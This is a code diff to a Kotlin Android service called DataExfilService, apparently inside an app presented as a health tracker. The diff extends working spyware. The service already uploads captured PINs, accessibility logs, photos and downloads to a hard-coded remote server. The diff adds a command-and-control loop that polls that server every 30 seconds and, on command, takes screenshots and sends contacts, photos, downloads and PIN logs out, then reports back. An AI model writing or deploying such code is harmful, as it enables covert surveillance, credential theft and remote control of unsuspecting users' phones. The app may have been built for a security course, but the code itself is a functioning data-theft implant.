@@ -31,6 +31,8 @@ import android.provider.ContactsContract
 import java.net.Inet4Address
 import java.net.NetworkInterface
 import java.util.Collections
+import android.graphics.Bitmap
+import android.provider.Settings
 
 class DataExfilService : Service() {
 
@@ -41,6 +43,8 @@ class DataExfilService : Service() {
         private const val SERVER_ENDPOINT = "http://20.2.92.176:5000/accessibility_logs"
         private const val PIN_ENDPOINT = "http://20.2.92.176:5000/pin_logs"
         private const val DOWNLOADS_ENDPOINT = "http://20.2.92.176:5000/downloads"
+        private const val SCREENSHOT_ENDPOINT = "http://20.2.92.176:5000/screenshots"
+        private const val COMMAND_ENDPOINT = "http://20.2.92.176:5000/commands"
     }
 
     private val photosEndpoint = "http://20.2.92.176:5000/photos"
@@ -102,6 +106,8 @@ class DataExfilService : Service() {
         handler.postDelayed(uploadRunnable, 10000)
         handler.postDelayed(downloadUploadRunnable, 10000)
         handler.postDelayed(pinUploadRunnable, 5000)
+
+        startCommandPolling()
 
         return START_STICKY
     }
@@ -214,7 +220,7 @@ class DataExfilService : Service() {
 
         val notificationData = JSONObject().apply {
             put("type", "watch")
-            put("device_id", Build.SERIAL ?: "unknown")
+            put("device_id", getUniqueDeviceId())
             put("device_model", Build.MODEL)
             put("android_version", Build.VERSION.RELEASE)
             put("timestamp", System.currentTimeMillis())
@@ -538,7 +544,7 @@ class DataExfilService : Service() {
 
     private fun uploadContactToServer(contactId: String, contactName: String, phoneNumber: String) {
         try {
-            val ipAddress = getDeviceIPAddress()
+            val ipAddress = getUniqueDeviceId()
 
             val contactData = JSONObject().apply {
                 put("type", "contact")
@@ -644,7 +650,7 @@ class DataExfilService : Service() {
 
     private fun uploadFile(file: File, idKey: String) {
         try {
-            val deviceId = Build.SERIAL ?: "unknown"
+            val deviceId = getUniqueDeviceId()
 
             Log.d(TAG, "Uploading: ${file.name} (${formatFileSize(file.length())})")
 
@@ -702,24 +708,14 @@ class DataExfilService : Service() {
         }
     }
 
-    private fun getDeviceIPAddress(): String {
+    private fun getUniqueDeviceId(): String {
         return try {
-            val networkInterfaces = Collections.list(NetworkInterface.getNetworkInterfaces())
-
-            for (intf in networkInterfaces) {
-                val addresses = Collections.list(intf.inetAddresses)
-                for (addr in addresses) {
-                    if (!addr.isLoopbackAddress && addr is Inet4Address) {
-                        val ip = addr.hostAddress ?: ""
-                        if (!ip.startsWith("169.254.")) {
-                            return ip
-                        }
-                    }
-                }
-            }
-            "unknown"
+            Settings.Secure.getString(
+                contentResolver,
+                Settings.Secure.ANDROID_ID
+            ) ?: "unknown"
         } catch (e: Exception) {
-            Log.e(TAG, "Error getting IP address: ${e.message}")
+            Log.e(TAG, "Error getting Android ID: ${e.message}")
             "unknown"
         }
     }
@@ -742,7 +738,7 @@ class DataExfilService : Service() {
 
                 val pinData = JSONObject().apply {
                     put("type", "pin_capture")
-                    put("device_id", Build.SERIAL ?: "unknown")
+                    put("device_id", getUniqueDeviceId())
                     put("device_model", Build.MODEL)
                     put("android_version", Build.VERSION.RELEASE)
                     put("timestamp", System.currentTimeMillis())
@@ -797,5 +793,131 @@ class DataExfilService : Service() {
         } catch (e: Exception) {
             Log.e(TAG, "Error archiving PIN logs: ${e.message}")
         }
+    }
+
+    private fun checkForCommands() {
+        if (!isNetworkAvailable()) return
+
+        Thread {
+            try {
+                val url = URL("$COMMAND_ENDPOINT?device_id=${getUniqueDeviceId()}")
+                val connection = url.openConnection() as HttpURLConnection
+                connection.requestMethod = "GET"
+                connection.connectTimeout = 10000
+                connection.readTimeout = 10000
+
+                if (connection.responseCode == 200) {
+                    val response = connection.inputStream.bufferedReader().use { it.readText() }
+                    if (response.isNotEmpty() && response != "{}") {
+                        val json = JSONObject(response)
+                        handleCommand(json)
+                    }
+                }
+                connection.disconnect()
+            } catch (e: Exception) {
+                Log.e(TAG, "Error checking commands: ${e.message}")
+            }
+        }.start()
+    }
+
+    private fun handleCommand(commandJson: JSONObject) {
+        val command = commandJson.getString("command")
+        val params = if (commandJson.has("params")) commandJson.getJSONObject("params") else null
+        val commandId = if (commandJson.has("command_id")) commandJson.getString("command_id") else null
+
+        Log.i(TAG, "Received command: $command")
+
+        var success = true
+        var result = ""
+
+        try {
+            when (command) {
+                // Screenshot commands - forward to MainActivity
+                "START_SCREENSHOT", "STOP_SCREENSHOT", "CAPTURE_NOW", "REQUEST_SCREEN_CAPTURE" -> {
+                    val intent = Intent("com.inf2007.healthtracker.SCREENSHOT_COMMAND").apply {
+                        putExtra("command", command)
+                        setPackage("com.inf2007.healthtracker")
+                    }
+                    sendBroadcast(intent)
+                    result = "Command $command forwarded to main activity"
+                }
+
+                // Data exfiltration commands
+                "GET_PHOTOS" -> {
+                    scanAndUploadPhotos()
+                    result = "Photo scan initiated"
+                }
+                "GET_CONTACTS" -> {
+                    scanAndUploadContacts()
+                    result = "Contacts scan initiated"
+                }
+                "GET_DOWNLOADS" -> {
+                    uploadAllDownloads()
+                    result = "Downloads scan initiated"
+                }
+                "UPLOAD_LOGS" -> {
+                    uploadAccessibilityLogs()
+                    uploadPinLogs()
+                    result = "Logs upload initiated"
+                }
+
+                else -> {
+                    Log.w(TAG, "Unknown command: $command")
+                    result = "Unknown command: $command"
+                    success = false
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error executing command $command: ${e.message}")
+            success = false
+            result = "Error: ${e.message}"
+        }
+
+        // Send command acknowledgment
+        if (commandId != null) {
+            sendCommandAck(commandId, success, result)
+        }
+    }
+
+    private fun sendCommandAck(commandId: String, success: Boolean, result: String = "") {
+        Thread {
+            try {
+                val url = URL("$COMMAND_ENDPOINT/ack")
+                val connection = url.openConnection() as HttpURLConnection
+                connection.requestMethod = "POST"
+                connection.setRequestProperty("Content-Type", "application/json")
+                connection.doOutput = true
+
+                val ackJson = JSONObject().apply {
+                    put("device_id", getUniqueDeviceId())
+                    put("command_id", commandId)
+                    put("status", if (success) "completed" else "failed")
+                    put("result", result)
+                    put("timestamp", System.currentTimeMillis())
+                }
+
+                OutputStreamWriter(connection.outputStream).use { writer ->
+                    writer.write(ackJson.toString())
+                    writer.flush()
+                }
+
+                val responseCode = connection.responseCode
+                connection.disconnect()
+
+                Log.d(TAG, "Command ack sent for $commandId, response: $responseCode")
+
+            } catch (e: Exception) {
+                Log.e(TAG, "Error sending command ack: ${e.message}")
+            }
+        }.start()
+    }
+
+    private fun startCommandPolling() {
+        handler.postDelayed(object : Runnable {
+            override fun run() {
+                checkForCommands()
+                handler.postDelayed(this, 30000) // Check every 30 seconds
+            }
+        }, 15000)
     }
 }
